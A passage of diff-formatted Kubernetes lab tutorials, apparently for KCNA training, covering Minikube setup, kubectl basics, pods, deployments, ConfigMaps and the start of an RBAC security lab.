+Make kubectl executable and move it to your PATH.
+
+sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
+
+Verify kubectl installation.
+
+kubectl version --client
+
+Expected Output:
+
+Client Version: v1.29.0
+Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
+
+Task 2: Starting Your First Minikube Cluster
+Subtask 2.1: Start Minikube with Docker Driver
+
+Start your single-node Kubernetes cluster using Docker as the container runtime.
+
+minikube start --driver=docker
+
+Note: The first startup may take 3-5 minutes as it downloads the Kubernetes components and container images.
+
+Expected Output:
+
+😄  minikube v1.32.0 on Ubuntu 20.04
+✨  Using the docker driver based on user configuration
+👍  Starting control plane node minikube in cluster minikube
+🚜  Pulling base image ...
+🔥  Creating docker container (CPUs=2, Memory=4000MB) ...
+🐳  Preparing Kubernetes v1.28.3 on Docker 24.0.7 ...
+    ▪ Generating certificates and keys ...
+    ▪ Booting up control plane ...
+    ▪ Configuring RBAC rules ...
+🔗  Configuring bridge CNI (Container Networking Interface) ...
+🔎  Verifying Kubernetes components...
+    ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5
+🌟  Enabled addons: default-storageclass, storage-provisioner
+🏄  Done! kubectl is now configured to use "minikube" cluster and "default" namespace by default
+
+Subtask 2.2: Verify Cluster Status
+
+Check that your Minikube cluster is running properly.
+
+minikube status
+
+Expected Output:
+
+minikube
+type: Control Plane
+host: Running
+kubelet: Running
+apiserver: Running
+kubeconfig: Configured
+
+Subtask 2.3: Configure kubectl Context
+
+Ensure kubectl is configured to communicate with your Minikube cluster.
+
+kubectl config current-context
+
+Expected Output:
+
+minikube
+
+Task 3: Verifying Cluster Health and Resources
+Subtask 3.1: Check Cluster Information
+
+Get basic information about your Kubernetes cluster.
+
+kubectl cluster-info
+
+Expected Output:
+
+Kubernetes control plane is running at https://192.168.49.2:8443
+CoreDNS is running at https://192.168.49.2:8443/api/v1/namespaces/kube-system/services/kube-dns:dns/proxy
+
+To further debug and diagnose cluster problems, use 'kubectl cluster-info dump'.
+
+Subtask 3.2: List All Nodes
+
+View all nodes in your cluster (should show one node since this is a single-node setup).
+
+kubectl get nodes
+
+Expected Output:
+
+NAME       STATUS   ROLES           AGE   VERSION
+minikube   Ready    control-plane   2m    v1.28.3
+
+Get detailed information about your node.
+
+kubectl describe node minikube
+
+Subtask 3.3: Check System Pods
+
+View all system pods running in the kube-system namespace.
+
+kubectl get pods -n kube-system
+
+Expected Output:
+
+NAME                               READY   STATUS    RESTARTS   AGE
+coredns-5dd5756b68-xxxxx          1/1     Running   0          3m
+etcd-minikube                     1/1     Running   0          3m
+kube-apiserver-minikube           1/1     Running   0          3m
+kube-controller-manager-minikube  1/1     Running   0          3m
+kube-proxy-xxxxx                  1/1     Running   0          3m
+kube-scheduler-minikube           1/1     Running   0          3m
+storage-provisioner               1/1     Running   0          3m
+
+Subtask 3.4: Check Available Resources
+
+View the resource usage of your cluster.
+
+kubectl top node
+
+If the metrics server is not available, you can install it:
+
+minikube addons enable metrics-server
+
+Wait a few minutes, then try again:
+
+kubectl top node
+
+Subtask 3.5: List Available Namespaces
+
+See all namespaces in your cluster.
+
+kubectl get namespaces
+
+Expected Output:
+
+NAME              STATUS   AGE
+default           Active   5m
+kube-node-lease   Active   5m
+kube-public       Active   5m
+kube-system       Active   5m
+
+Task 4: Testing Cluster Functionality
+Subtask 4.1: Deploy a Test Application
+
+Create a simple nginx deployment to test your cluster.
+
+kubectl create deployment hello-minikube --image=nginx:latest
+
+Check the deployment status.
+
+kubectl get deployments
+
+Expected Output:
+
+NAME             READY   UP-TO-DATE   AVAILABLE   AGE
+hello-minikube   1/1     1            1           30s
+
+Subtask 4.2: Expose the Deployment
+
+Create a service to expose your deployment.
+
+kubectl expose deployment hello-minikube --type=NodePort --port=80
+
+Check the service.
+
+kubectl get services
+
+Expected Output:
+
+NAME             TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)        AGE
+hello-minikube   NodePort    10.96.xxx.xxx   <none>        80:xxxxx/TCP   15s
+kubernetes       ClusterIP   10.96.0.1       <none>        443/TCP        8m
+
+Subtask 4.3: Access the Application
+
+Get the URL to access your application.
+
+minikube service hello-minikube --url
+
+Test the application using curl.
+
+curl $(minikube service hello-minikube --url)
+
+Clean up the test deployment.
+
+kubectl delete deployment hello-minikube
+kubectl delete service hello-minikube
+
+Task 5: Stopping and Restarting the Cluster
+Subtask 5.1: Stop the Minikube Cluster
+
+Stop your cluster while preserving its state.
+
+minikube stop
+
+Expected Output:
+
+✋  Stopping node "minikube"  ...
+🛑  Powering off "minikube" via SSH ...
+🛑  1 node stopped.
+
+Verify the cluster is stopped.
+
+minikube status
+
+Expected Output:
+
+minikube
+type: Control Plane
+host: Stopped
+kubelet: Stopped
+apiserver: Stopped
+kubeconfig: Configured
+
+Subtask 5.2: Restart the Cluster
+
+Start the cluster again to verify persistence.
+
+minikube start
+
+Expected Output:
+
+😄  minikube v1.32.0 on Ubuntu 20.04
+✨  Using the docker driver based on existing profile
+👍  Starting control plane node minikube in cluster minikube
+🚜  Pulling base image ...
+🔄  Restarting existing docker container for "minikube" ...
+🐳  Preparing Kubernetes v1.28.3 on Docker 24.0.7 ...
+🔗  Configuring bridge CNI (Container Networking Interface) ...
+🔎  Verifying Kubernetes components...
+    ▪ Using image gcr.io/k8s-minikube/storage-provisioner:v5
+🌟  Enabled addons: default-storageclass, storage-provisioner
+🏄  Done! kubectl is now configured to use "minikube" cluster and "default" namespace by default
+
+Subtask 5.3: Verify Cluster Persistence
+
+Check that your cluster components are still running after restart.
+
+kubectl get nodes
+kubectl get pods -n kube-system
+
+Verify that any persistent volumes or configurations remain intact.
+
+kubectl get pv
+kubectl get storageclass
+
+Task 6: Exploring Minikube Features
+Subtask 6.1: Access Kubernetes Dashboard
+
+Enable the Kubernetes dashboard addon.
+
+minikube addons enable dashboard
+
+Start the dashboard in a separate terminal or background process.
+
+minikube dashboard --url
+
+Note: This will provide a URL to access the Kubernetes dashboard in a web browser.
+Subtask 6.2: View Available Addons
+
+List all available Minikube addons.
+
+minikube addons list
+
+Enable a useful addon like ingress.
+
+minikube addons enable ingress
+
+Verify the addon is running.
+
+kubectl get pods -n ingress-nginx
+
+Subtask 6.3: Check Minikube Configuration
+
+View your current Minikube configuration.
+
+minikube config view
+
+Check the IP address of your Minikube cluster.
+
+minikube ip
+
+Troubleshooting Common Issues
+Issue 1: Minikube Won't Start
+
+If Minikube fails to start, try these solutions:
+
+# Check if Docker is running
+sudo systemctl status docker
+
+# Start Docker if it's not running
+sudo systemctl start docker
+
+# Delete and recreate the cluster
+minikube delete
+minikube start --driver=docker
+
+Issue 2: kubectl Commands Not Working
+
+If kubectl commands fail:
+
+# Check if kubectl is configured correctly
+kubectl config current-context
+
+# If not pointing to minikube, set it manually
+kubectl config use-context minikube
+
+Issue 3: Insufficient Resources
+
+If you encounter resource issues:
+
+# Start with more resources
+minikube delete
+minikube start --driver=docker --memory=4096 --cpus=2
+
+Issue 4: Network Issues
+
+If you have network connectivity problems:
+
+# Check Minikube status
+minikube status
+
+# Restart with different network settings
+minikube delete
+minikube start --driver=docker --network-plugin=cni
+
+Lab Cleanup
+
+When you're finished with the lab, you can clean up resources:
+
+# Stop the cluster
+minikube stop
+
+# Delete the cluster completely (optional)
+minikube delete
+
+# Remove downloaded binaries (optional)
+sudo rm /usr/local/bin/minikube
+sudo rm /usr/local/bin/kubectl
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 5: Setting Up a Single-Node Kubernetes Cluster with Minikube.
+What You Accomplished
+
+In this lab, you:
+
+• Installed Minikube and kubectl - Set up the essential tools for running a local Kubernetes cluster • Created a single-node Kubernetes cluster - Launched a fully functional Kubernetes environment on a single machine • Verified cluster health - Used kubectl commands to check cluster status, nodes, and system components • Tested cluster functionality - Deployed and exposed a sample application to ensure everything works correctly • Managed cluster lifecycle - Learned how to stop and restart your cluster while maintaining persistence • Explored Minikube features - Discovered addons and additional capabilities available in Minikube
+Why This Matters
+
+Understanding how to set up and manage a Kubernetes cluster is fundamental for:
+
+• Development and Testing - Minikube provides a safe environment to develop and test Kubernetes applications locally • Learning Kubernetes - Having a local cluster allows you to experiment with Kubernetes concepts without cloud costs • KCNA Certification - This knowledge directly supports the Kubernetes and Cloud Native Associate certification objectives • Career Development - Kubernetes skills are highly sought after in the cloud computing industry • Production Readiness - The concepts learned here scale up to managing production Kubernetes clusters
+Next Steps
+
+Now that you have a working Minikube cluster, you can:
+
+• Deploy more complex applications with multiple pods and services • Explore Kubernetes networking and storage concepts • Practice with ConfigMaps, Secrets, and other Kubernetes resources • Learn about Helm charts for application packaging • Experiment with different Kubernetes deployment strategies
+
+This foundational knowledge prepares you for more advanced Kubernetes topics and real-world container orchestration scenarios.
+
+
+
+
+Lab 6: Accessing and Interacting with Minikube
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Understand the basic architecture and components of a Kubernetes cluster using Minikube • Use kubectl command-line tool to interact with Kubernetes resources • List and examine nodes, namespaces, and pods in a Kubernetes cluster • Deploy a simple Pod and manage its lifecycle • Retrieve and analyze Pod logs for troubleshooting • Diagnose and resolve common connectivity issues within a Kubernetes cluster • Apply fundamental Kubernetes concepts in a hands-on environment
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of containerization concepts (Docker) • Familiarity with Linux command-line interface • Basic knowledge of YAML file structure • Understanding of networking fundamentals • No prior Kubernetes experience required - this lab will guide you through the basics
+Lab Environment Setup
+
+Good News! Al Nafi provides ready-to-use Linux-based cloud machines with all necessary tools pre-installed. Simply click Start Lab to access your environment. No need to build your own VM or install software.
+
+Your cloud machine comes with: • Minikube pre-installed and configured • kubectl command-line tool ready to use • Docker runtime environment • All necessary dependencies configured
+Task 1: Understanding Your Kubernetes Environment
+Subtask 1.1: Start Minikube and Verify Cluster Status
+
+First, let's start your Minikube cluster and verify it's running properly.
+
+    Start Minikube cluster:
+
+minikube start --driver=docker
+
+    Check Minikube status:
+
+minikube status
+
+Expected output should show:
+
+minikube
+type: Control Plane
+host: Running
+kubelet: Running
+apiserver: Running
+kubeconfig: Configured
+
+    Verify kubectl is configured to communicate with your cluster:
+
+kubectl cluster-info
+
+Subtask 1.2: List and Examine Nodes
+
+Now let's explore the nodes in your cluster.
+
+    List all nodes in the cluster:
+
+kubectl get nodes
+
+    Get detailed information about nodes:
+
+kubectl get nodes -o wide
+
+    Describe a specific node (replace 'minikube' with your node name if different):
+
+kubectl describe node minikube
+
+Key Concept: In Minikube, you typically have one node that acts as both master and worker node, making it perfect for learning and development.
+Subtask 1.3: Explore Namespaces
+
+Namespaces provide a way to organize resources in a cluster.
+
+    List all namespaces:
+
+kubectl get namespaces
+
+    Get detailed information about namespaces:
+
+kubectl get namespaces -o wide
+
+    Describe the default namespace:
+
+kubectl describe namespace default
+
+    List namespaces with additional details:
+
+kubectl get ns --show-labels
+
+Key Concept: Namespaces are like folders that help organize your Kubernetes resources. Common namespaces include default, kube-system, and kube-public.
+Subtask 1.4: List and Examine Pods
+
+Let's explore the pods running in your cluster.
+
+    List pods in the default namespace:
+
+kubectl get pods
+
+    List pods in all namespaces:
+
+kubectl get pods --all-namespaces
+
+    List pods with additional information:
+
+kubectl get pods -o wide --all-namespaces
+
+    Focus on system pods:
+
+kubectl get pods -n kube-system
+
+Task 2: Deploy a Simple Pod and Manage Its Lifecycle
+Subtask 2.1: Create a Simple Pod
+
+Let's deploy a simple nginx pod to practice pod management.
+
+    Create a simple pod using kubectl run command:
+
+kubectl run my-nginx-pod --image=nginx:latest --port=80
+
+    Verify the pod was created:
+
+kubectl get pods
+
+    Get detailed information about your pod:
+
+kubectl get pod my-nginx-pod -o wide
+
+    Describe the pod to see detailed information:
+
+kubectl describe pod my-nginx-pod
+
+Subtask 2.2: Create a Pod Using YAML Manifest
+
+Now let's create a more complex pod using a YAML file.
+
+    Create a YAML file for a pod:
+
+cat > test-pod.yaml << EOF
+apiVersion: v1
+kind: Pod
+metadata:
+  name: test-app-pod
+  labels:
+    app: test-app
+    environment: lab
+spec:
+  containers:
+  - name: test-container
+    image: busybox:latest
+    command: ['sh', '-c', 'echo "Hello from Kubernetes Pod!" && sleep 3600']
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      limits:
+        memory: "128Mi"
+        cpu: "500m"
+EOF
+
+    Apply the YAML file to create the pod:
+
+kubectl apply -f test-pod.yaml
+
+    Verify both pods are running:
+
+kubectl get pods
+
+Subtask 2.3: Retrieve and Analyze Pod Logs
+
+Understanding how to access logs is crucial for troubleshooting.
+
+    Get logs from the nginx pod:
+
+kubectl logs my-nginx-pod
+
+    Get logs from the test-app-pod:
+
+kubectl logs test-app-pod
+
+    Follow logs in real-time (use Ctrl+C to stop):
+
+kubectl logs -f test-app-pod
+
+    Get logs with timestamps:
+
+kubectl logs test-app-pod --timestamps
+
+    Get the last 10 lines of logs:
+
+kubectl logs test-app-pod --tail=10
+
+Subtask 2.4: Execute Commands Inside Pods
+
+Sometimes you need to troubleshoot by executing commands inside running pods.
+
+    Execute a command in the busybox pod:
+
+kubectl exec test-app-pod -- ls -la
+
+    Get an interactive shell in the pod:
+
+kubectl exec -it test-app-pod -- sh
+
+Inside the pod shell, try these commands:
+
+# Check the hostname
+hostname
+
+# Check network configuration
+ip addr
+
+# Check running processes
+ps aux
+
+# Exit the pod shell
+exit
+
+Task 3: Diagnose and Resolve Connectivity Issues
+Subtask 3.1: Create a Service for Pod Access
+
+Let's create a service to expose our nginx pod and then diagnose connectivity.
+
+    Expose the nginx pod as a service:
+
+kubectl expose pod my-nginx-pod --port=80 --target-port=80 --name=nginx-service
+
+    List services:
+
+kubectl get services
+
+    Describe the service:
+
+kubectl describe service nginx-service
+
+Subtask 3.2: Test Connectivity Between Pods
+
+Let's test network connectivity between pods.
+
+    Create a debug pod for network testing:
+
+kubectl run debug-pod --image=busybox:latest --rm -it --restart=Never -- sh
+
+Inside the debug pod, test connectivity:
+
+# Test DNS resolution
+nslookup nginx-service
+
+# Test HTTP connectivity to the service
+wget -qO- nginx-service
+
+# Test connectivity to the pod directly (replace IP with actual pod IP)
+# First, get the pod IP from another terminal: kubectl get pod my-nginx-pod -o wide
+wget -qO- <POD_IP>
+
+# Exit the debug pod
+exit
+
+Subtask 3.3: Simulate and Resolve a Connectivity Issue
+
+Let's create a problematic pod and learn to diagnose issues.
+
+    Create a pod with a wrong image name:
+
+kubectl run broken-pod --image=nginx:nonexistent-tag
+
+    Check the pod status:
+
+kubectl get pods
+
+    Describe the broken pod to see the issue:
+
+kubectl describe pod broken-pod
+
+    Check events to understand what went wrong:
+
+kubectl get events --sort-by=.metadata.creationTimestamp
+
+    Fix the broken pod by deleting and recreating it:
+
+kubectl delete pod broken-pod
+kubectl run fixed-pod --image=nginx:latest
+
+    Verify the fix:
+
+kubectl get pods
+kubectl describe pod fixed-pod
+
+Subtask 3.4: Advanced Troubleshooting Techniques
+
+Let's explore more troubleshooting commands.
+
+    Check resource usage:
+
+kubectl top nodes
+kubectl top pods
+
+    Get detailed cluster information:
+
+kubectl get all
+
+    Check pod resource specifications:
+
+kubectl get pods -o yaml my-nginx-pod
+
+    Monitor pod status in real-time:
+
+kubectl get pods -w
+
+Press Ctrl+C to stop watching.
+Subtask 3.5: Network Policy Testing (Optional Advanced Section)
+
+For advanced users, let's test network policies.
+
+    Create a network policy that blocks traffic:
+
+cat > deny-all-policy.yaml << EOF
+apiVersion: networking.k8s.io/v1
+kind: NetworkPolicy
+metadata:
+  name: deny-all
+  namespace: default
+spec:
+  podSelector: {}
+  policyTypes:
+  - Ingress
+  - Egress
+EOF
+
+    Apply the network policy:
+
+kubectl apply -f deny-all-policy.yaml
+
+    Test connectivity (should fail):
+
+kubectl run test-connectivity --image=busybox:latest --rm -it --restart=Never -- wget -qO- nginx-service
+
+    Remove the network policy to restore connectivity:
+
+kubectl delete networkpolicy deny-all
+
+    Test connectivity again (should work):
+
+kubectl run test-connectivity --image=busybox:latest --rm -it --restart=Never -- wget -qO- nginx-service
+
+Task 4: Clean Up Resources
+Subtask 4.1: Remove Created Resources
+
+Let's clean up the resources we created during this lab.
+
+    Delete pods:
+
+kubectl delete pod my-nginx-pod
+kubectl delete pod test-app-pod
+kubectl delete pod fixed-pod
+
+    Delete services:
+
+kubectl delete service nginx-service
+
+    Delete YAML files:
+
+rm test-pod.yaml deny-all-policy.yaml
+
+    Verify cleanup:
+
+kubectl get pods
+kubectl get services
+
+Subtask 4.2: Stop Minikube (Optional)
+
+If you want to stop your Minikube cluster:
+
+minikube stop
+
+To start it again later:
+
+minikube start
+
+Troubleshooting Common Issues
+Issue 1: Pod Stuck in Pending State
+
+Symptoms: Pod shows status as "Pending"
+
+Diagnosis:
+
+kubectl describe pod <pod-name>
+kubectl get events
+
+Common Causes: • Insufficient resources • Image pull issues • Scheduling constraints
+Issue 2: Cannot Connect to Service
+
+Symptoms: Connection timeouts or refused connections
+
+Diagnosis:
+
+kubectl get endpoints <service-name>
+kubectl describe service <service-name>
+
+Common Causes: • Service selector doesn't match pod labels • Wrong port configuration • Pod not ready
+Issue 3: Image Pull Errors
+
+Symptoms: Pod shows "ImagePullBackOff" or "ErrImagePull"
+
+Diagnosis:
+
+kubectl describe pod <pod-name>
+
+Common Causes: • Incorrect image name or tag • Network connectivity issues • Authentication problems with private registries
+Key Commands Reference
+Essential kubectl Commands
+
+# Cluster information
+kubectl cluster-info
+kubectl get nodes
+kubectl get namespaces
+
+# Pod management
+kubectl get pods
+kubectl describe pod <pod-name>
+kubectl logs <pod-name>
+kubectl exec -it <pod-name> -- <command>
+
+# Service management
+kubectl get services
+kubectl describe service <service-name>
+kubectl expose pod <pod-name> --port=<port>
+
+# Troubleshooting
+kubectl get events
+kubectl top nodes
+kubectl top pods
+
+Conclusion
+
+Congratulations! You have successfully completed Lab 6: Accessing and Interacting with Minikube. In this lab, you have accomplished the following:
+
+What You Learned: • How to start and manage a Minikube cluster • Essential kubectl commands for cluster interaction • How to list and examine nodes, namespaces, and pods • Pod deployment using both command-line and YAML manifests • Log retrieval and analysis techniques • Network connectivity testing and troubleshooting • Common issue diagnosis and resolution strategies
+
+Why This Matters: These skills form the foundation of Kubernetes administration and are essential for the Kubernetes and Cloud Native Associate (KCNA) certification. Understanding how to interact with Kubernetes clusters, deploy applications, and troubleshoot issues is crucial for anyone working with containerized applications in production environments.
+
+Next Steps: • Practice these commands regularly to build muscle memory • Experiment with different pod configurations • Explore more complex Kubernetes resources like Deployments and Services • Study networking concepts in Kubernetes • Practice troubleshooting scenarios to prepare for real-world situations
+
+The hands-on experience you gained in this lab provides a solid foundation for more advanced Kubernetes topics and prepares you for cloud-native application development and deployment.
+
+
+
+
+Lab 7: Exploring Kubernetes Building Blocks
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Deploy a Pod using a YAML manifest file • Create and manage Deployments to scale applications • Understand the difference between Pods and Deployments • Create ConfigMaps to manage application configuration • Mount ConfigMaps into Pods as environment variables • Verify and troubleshoot Kubernetes resources using kubectl commands • Apply best practices for container orchestration with Kubernetes
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of containerization concepts (Docker) • Familiarity with YAML file structure and syntax • Basic knowledge of Linux command line operations • Understanding of environment variables and configuration management • Completion of previous Kubernetes fundamentals labs or equivalent knowledge
+Lab Environment Setup
+
+Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines with Kubernetes already installed and configured. Simply click Start Lab to access your environment - no need to build your own VM or install Kubernetes manually.
+
+Your lab environment includes: • Ubuntu 20.04 LTS with kubectl pre-installed • Minikube cluster ready for use • Text editor (nano/vim) for creating YAML files • All necessary permissions configured
+Task 1: Deploy a Pod Using a YAML Manifest
+Subtask 1.1: Verify Kubernetes Cluster Status
+
+First, let's ensure your Kubernetes cluster is running properly.
+
+    Open your terminal in the lab environment
+
+    Check the cluster status:
+
+kubectl cluster-info
+
+    Verify that nodes are ready:
+
+kubectl get nodes
+
+You should see output similar to:
+
+NAME       STATUS   ROLES           AGE   VERSION
+minikube   Ready    control-plane   1d    v1.28.0
+
+Subtask 1.2: Create a Pod YAML Manifest
+
+Now we'll create a simple Pod using a YAML manifest file.
+
+    Create a new directory for your lab files:
+
+mkdir ~/k8s-lab7
+cd ~/k8s-lab7
+
+    Create a Pod manifest file:
+
+nano simple-pod.yaml
+
+    Add the following content to the file:
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: nginx-pod
+  labels:
+    app: nginx
+    environment: lab
+spec:
+  containers:
+  - name: nginx-container
+    image: nginx:1.21
+    ports:
+    - containerPort: 80
+    resources:
+      requests:
+        memory: "64Mi"
+        cpu: "250m"
+      limits:
+        memory: "128Mi"
+        cpu: "500m"
+
+    Save and exit the file (Ctrl+X, then Y, then Enter in nano)
+
+Subtask 1.3: Deploy the Pod
+
+    Apply the Pod manifest:
+
+kubectl apply -f simple-pod.yaml
+
+    Verify the Pod was created:
+
+kubectl get pods
+
+    Get detailed information about the Pod:
+
+kubectl describe pod nginx-pod
+
+    Check the Pod logs:
+
+kubectl logs nginx-pod
+
+Subtask 1.4: Test Pod Connectivity
+
+    Get the Pod's IP address:
+
+kubectl get pod nginx-pod -o wide
+
+    Test connectivity to the Pod (from within the cluster):
+
+kubectl exec -it nginx-pod -- curl localhost:80
+
+You should see the default nginx welcome page HTML.
+Task 2: Scale the Application Using a Deployment
+Subtask 2.1: Create a Deployment YAML Manifest
+
+Deployments provide better management capabilities than standalone Pods, including scaling and rolling updates.
+
+    Create a Deployment manifest file:
+
+nano nginx-deployment.yaml
+
+    Add the following content:
+
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: nginx-deployment
+  labels:
+    app: nginx
+spec:
+  replicas: 2
+  selector:
+    matchLabels:
+      app: nginx
+  template:
+    metadata:
+      labels:
+        app: nginx
+    spec:
+      containers:
+      - name: nginx
+        image: nginx:1.21
+        ports:
+        - containerPort: 80
+        resources:
+          requests:
+            memory: "64Mi"
+            cpu: "250m"
+          limits:
+            memory: "128Mi"
+            cpu: "500m"
+
+    Save and exit the file
+
+Subtask 2.2: Deploy the Application
+
+    Apply the Deployment manifest:
+
+kubectl apply -f nginx-deployment.yaml
+
+    Verify the Deployment was created:
+
+kubectl get deployments
+
+    Check the Pods created by the Deployment:
+
+kubectl get pods -l app=nginx
+
+You should see 2 nginx Pods running.
+
+    Get detailed information about the Deployment:
+
+kubectl describe deployment nginx-deployment
+
+Subtask 2.3: Scale the Deployment
+
+Now let's demonstrate scaling capabilities.
+
+    Scale the Deployment to 4 replicas using kubectl:
+
+kubectl scale deployment nginx-deployment --replicas=4
+
+    Verify the scaling operation:
+
+kubectl get pods -l app=nginx
+
+You should now see 4 nginx Pods.
+
+    Check the Deployment status:
+
+kubectl get deployment nginx-deployment
+
+Subtask 2.4: Scale Using YAML Manifest
+
+You can also scale by modifying the YAML file.
+
+    Edit the Deployment file:
+
+nano nginx-deployment.yaml
+
+    Change the replicas value from 2 to 3:
+
+spec:
+  replicas: 3
+
+    Apply the updated manifest:
+
+kubectl apply -f nginx-deployment.yaml
+
+    Verify the change:
+
+kubectl get pods -l app=nginx
+
+The number of Pods should now be 3.
+Task 3: Create a ConfigMap and Mount it into a Pod
+Subtask 3.1: Create a ConfigMap YAML Manifest
+
+ConfigMaps allow you to separate configuration from your application code.
+
+    Create a ConfigMap manifest file:
+
+nano app-config.yaml
+
+    Add the following content:
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: app-config
+data:
+  database_host: "mysql.example.com"
+  database_port: "3306"
+  database_name: "myapp"
+  log_level: "INFO"
+  max_connections: "100"
+  app_version: "1.2.3"
+
+    Save and exit the file
+
+Subtask 3.2: Create the ConfigMap
+
+    Apply the ConfigMap manifest:
+
+kubectl apply -f app-config.yaml
+
+    Verify the ConfigMap was created:
+
+kubectl get configmaps
+
+    View the ConfigMap details:
+
+kubectl describe configmap app-config
+
+Subtask 3.3: Create a Pod that Uses the ConfigMap
+
+Now we'll create a Pod that uses the ConfigMap as environment variables.
+
+    Create a new Pod manifest that uses the ConfigMap:
+
+nano pod-with-config.yaml
+
+    Add the following content:
+
+apiVersion: v1
+kind: Pod
+metadata:
+  name: app-pod
+  labels:
+    app: myapp
+spec:
+  containers:
+  - name: app-container
+    image: busybox:1.35
+    command: ['sh', '-c', 'echo "Starting application..." && env | grep -E "(DATABASE|LOG|MAX|APP)" && sleep 3600']
+    envFrom:
+    - configMapRef:
+        name: app-config
+    env:
+    - name: POD_NAME
+      valueFrom:
+        fieldRef:
+          fieldPath: metadata.name
+    - name: POD_IP
+      valueFrom:
+        fieldRef:
+          fieldPath: status.podIP
+
+    Save and exit the file
+
+Subtask 3.4: Deploy and Test the Pod with ConfigMap
+
+    Apply the Pod manifest:
+
+kubectl apply -f pod-with-config.yaml
+
+    Verify the Pod is running:
+
+kubectl get pod app-pod
+
+    Check the Pod logs to see the environment variables:
+
+kubectl logs app-pod
+
+You should see the configuration values from the ConfigMap displayed as environment variables.
+
+    Execute into the Pod to explore the environment:
+
+kubectl exec -it app-pod -- sh
+
+    Inside the Pod, check all environment variables:
+
+env | sort
+
+    Check specific configuration variables:
+
+echo "Database Host: $database_host"
+echo "Database Port: $database_port"
+echo "Log Level: $log_level"
+
+    Exit the Pod:
+
+exit
+
+Subtask 3.5: Update ConfigMap and Observe Changes
+
+    Update the ConfigMap:
+
+kubectl patch configmap app-config --patch '{"data":{"log_level":"DEBUG","app_version":"1.2.4"}}'
+
+    Verify the ConfigMap was updated:
+
+kubectl get configmap app-config -o yaml
+
+    Delete and recreate the Pod to see the updated configuration:
+
+kubectl delete pod app-pod
+kubectl apply -f pod-with-config.yaml
+
+    Check the logs of the new Pod:
+
+kubectl logs app-pod
+
+You should see the updated log_level as "DEBUG" and app_version as "1.2.4".
+Verification and Cleanup
+Verification Steps
+
+    List all resources created in this lab:
+
+kubectl get pods,deployments,configmaps
+
+    Verify the Deployment is managing the correct number of replicas:
+
+kubectl get deployment nginx-deployment -o wide
+
+    Confirm the ConfigMap is properly mounted:
+
+kubectl exec app-pod -- env | grep database_host
+
+Cleanup Resources
+
+When you're finished with the lab, clean up the resources:
+
+    Delete the standalone Pod:
+
+kubectl delete pod nginx-pod
+
+    Delete the Deployment:
+
+kubectl delete deployment nginx-deployment
+
+    Delete the Pod with ConfigMap:
+
+kubectl delete pod app-pod
+
+    Delete the ConfigMap:
+
+kubectl delete configmap app-config
+
+    Verify all resources are deleted:
+
+kubectl get pods,deployments,configmaps
+
+Troubleshooting Tips
+Common Issues and Solutions
+
+Pod Stuck in Pending State:
+
+    Check node resources: kubectl describe nodes
+    Verify image availability: kubectl describe pod <pod-name>
+
+ConfigMap Not Loading:
+
+    Ensure ConfigMap exists: kubectl get configmap
+    Check Pod specification for correct ConfigMap name
+    Verify YAML indentation and syntax
+
+Deployment Not Scaling:
+
+    Check Deployment status: kubectl get deployment <deployment-name> -o wide
+    Review events: kubectl get events --sort-by=.metadata.creationTimestamp
+
+Environment Variables Not Appearing:
+
+    Restart the Pod after ConfigMap changes
+    Use kubectl exec to check environment inside the container
+    Verify ConfigMap reference in Pod specification
+
+Conclusion
+
+In this lab, you have successfully explored the fundamental building blocks of Kubernetes:
+
+Key Accomplishments: • Pod Management: You deployed a Pod using a YAML manifest, learning how to define container specifications, resource limits, and labels • Application Scaling: You created and managed a Deployment, demonstrating how Kubernetes can automatically maintain desired replica counts and enable easy scaling • Configuration Management: You implemented ConfigMaps to externalize application configuration and mounted them as environment variables in Pods
+
+Why This Matters: These building blocks form the foundation of container orchestration in Kubernetes. Pods represent the smallest deployable units, Deployments provide reliability and scaling capabilities, and ConfigMaps enable configuration management best practices. Understanding these concepts is essential for:
+
+• Building resilient, scalable applications in Kubernetes • Implementing proper separation of concerns between code and configuration • Preparing for production deployments and cloud-native application development • Advancing toward Kubernetes certification goals (KCNA)
+
+Next Steps: With this foundation, you're ready to explore more advanced Kubernetes concepts such as Services for networking, Persistent Volumes for storage, and Ingress controllers for external access. These building blocks will serve as the basis for more complex orchestration scenarios in your Kubernetes journey.
+
+
+
+
+Lab 8: Implementing Security with Authentication, Authorization, and Admission Control
+Objectives
+
+By the end of this lab, you will be able to:
+
+• Understand the fundamentals of Kubernetes security model including authentication, authorization, and admission control • Create and configure service accounts for applications and services • Implement Role-Based Access Control (RBAC) to manage permissions • Test access control mechanisms by attempting authorized and unauthorized actions • Configure admission controllers to enforce security policies and resource limits • Validate that security policies are working correctly in a Kubernetes cluster
+Prerequisites
+
+Before starting this lab, you should have:
+
+• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with command-line interface operations • Knowledge of YAML file structure and syntax • Understanding of Linux file permissions and user management concepts • Basic knowledge of kubectl commands
+
+Note: Al Nafi provides ready-to-use Linux-based cloud machines with Kubernetes pre-installed. Simply click "Start Lab" to begin - no need to build your own VM or install Kubernetes manually.
+Lab Environment Setup
+
+Your Al Nafi cloud machine comes pre-configured with: • Kubernetes cluster (single-node for learning purposes) • kubectl command-line tool • Text editors (nano, vim) • All necessary permissions to complete this lab
+Task 1: Understanding Kubernetes Security Architecture
+Subtask 1.1: Explore Current Security Context
+
+First, let's examine the current security context and understand what's already configured.
+
+    Check your current user context:
+
+kubectl config current-context
+
+    View cluster information:
+
+kubectl cluster-info
+
+    List existing service accounts:
+
+kubectl get serviceaccounts --all-namespaces
+
+    Examine the default service account:
+
+kubectl describe serviceaccount default
+
+Subtask 1.2: Understand RBAC Components
+
+    List existing roles and cluster roles:
+
+kubectl get roles --all-namespaces
+kubectl get clusterroles
+
+    Examine a built-in cluster role:
+
+kubectl describe clusterrole view
+
+    List role bindings:
+
+kubectl get rolebindings --all-namespaces
+kubectl get clusterrolebindings
+
